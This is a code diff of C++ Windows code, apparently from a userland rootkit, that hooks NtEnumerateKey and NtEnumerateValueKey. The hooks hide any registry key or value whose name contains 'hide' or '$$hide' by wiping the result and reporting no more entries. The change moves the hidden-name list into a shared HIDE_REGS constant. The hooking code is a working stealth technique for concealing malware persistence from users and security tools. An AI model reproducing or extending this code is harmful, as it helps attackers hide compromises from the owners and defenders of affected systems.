@@ -36,14 +36,13 @@ std::vector<std::wstring> deserializeWStringVector(std::wstring fileName) {
 }
 
 NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength) {
-    vector<wstring> hideRegs = { L"hide", L"$$hide" };
     NTSTATUS status = origNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
     WCHAR* keyName = NULL;
 
     if (KeyInformationClass == KeyBasicInformation) keyName = ((KEY_BASIC_INFORMATION*)KeyInformation)->Name;
     if (KeyInformationClass == KeyNameInformation) keyName = ((KEY_NAME_INFORMATION*)KeyInformation)->Name;
 
-    for (const auto& hideReg : hideRegs) {
+    for (const auto& hideReg : HIDE_REGS) {
         if (wcsstr(keyName, hideReg.c_str())) {
             ZeroMemory(KeyInformation, Length);
             status = STATUS_NO_MORE_ENTRIES;
@@ -55,14 +54,14 @@ NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATI
 
 
 NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength) {
-    vector<wstring> hideRegs = { L"hide", L"$$hide" };   
+    //vector<wstring> hideRegs = { L"hide", L"$$hide" };   
     NTSTATUS status = origNtEnumerateValueKey(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
     WCHAR* keyValueName = NULL;
 
     if (KeyValueInformationClass == KeyValueBasicInformation) keyValueName = ((KEY_VALUE_BASIC_INFORMATION*)KeyValueInformation)->Name;
     if (KeyValueInformationClass == KeyValueFullInformation) keyValueName = ((KEY_VALUE_FULL_INFORMATION*)KeyValueInformation)->Name;
 
-    for (const auto& hideReg : hideRegs) {
+    for (const auto& hideReg : HIDE_REGS) {
         if (wcsstr(keyValueName, hideReg.c_str())) {
             ZeroMemory(KeyValueInformation, Length);
             status = STATUS_NO_MORE_ENTRIES;
